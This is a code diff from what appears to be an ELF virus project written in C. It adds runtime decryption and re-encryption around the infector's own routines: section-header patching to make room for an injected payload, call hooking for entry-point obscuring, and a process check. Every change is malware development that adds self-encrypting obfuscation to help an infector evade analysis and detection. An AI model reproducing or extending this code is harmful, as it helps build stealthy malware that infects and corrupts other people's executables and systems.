@@ -140,7 +140,9 @@ int		find_text(t_info *info, t_fingerprint *fingerprint)
 			info->text_addr = header->p_vaddr;
 			header->p_filesz += INJECT_SIZE;
 			header->p_memsz += INJECT_SIZE;
+			key = decrypt_func(info, &patch_sections_header, info->tab_addr[5] - info->tab_addr[4], 4);
 			patch_sections_header(info, info->begin_bss, info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
+			reencrypt_func(info, &patch_sections_header, info->tab_addr[5] - info->tab_addr[4], key);
 			main_header->e_shoff += (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
 			return (0);
 		}
@@ -236,8 +238,12 @@ void		epo_parsing(t_info *info)
 			{
 				nb++;
 				info->addr_call_to_replace = info->text_begin + i;
+				uint32_t key2 = decrypt_func(info, &patch_close_entries, info->tab_addr[8] - info->tab_addr[7], 7);
 				patch_close_entries(info, nb);
+				reencrypt_func(info, &patch_close_entries, info->tab_addr[8] - info->tab_addr[7], key2);
+				key2 = decrypt_func(info, &hook_call, info->tab_addr[7] - info->tab_addr[6], 6);
 				hook_call(info, nb);
+				reencrypt_func(info, &hook_call, info->tab_addr[7] - info->tab_addr[6], key2);
 				patch_bis(info, nb);
 			}
 			nb_call_detected++;
@@ -319,6 +325,9 @@ int		check_process(char *path)
 				ft_strcat(buf_path_file, dir->d_name);
 				ft_strcat(buf_path_file, buf_stat);
 				pid_len = ft_strlen(dir->d_name);
+// 				uint32_t key = decrypt_func(info, &parse_process, info->tab_addr[11] - info->tab_addr[10], 10);
+// 				int ret = parse_process(buf_path_file, pid_len, buf_inhibitor);
+// 				reencrypt_func(info, &parse_process, info->tab_addr[x + 1] - info->tab_addr[x], key);
 				if ((parse_process(buf_path_file, pid_len, buf_inhibitor)) == 1)
 					goto found;
 			}
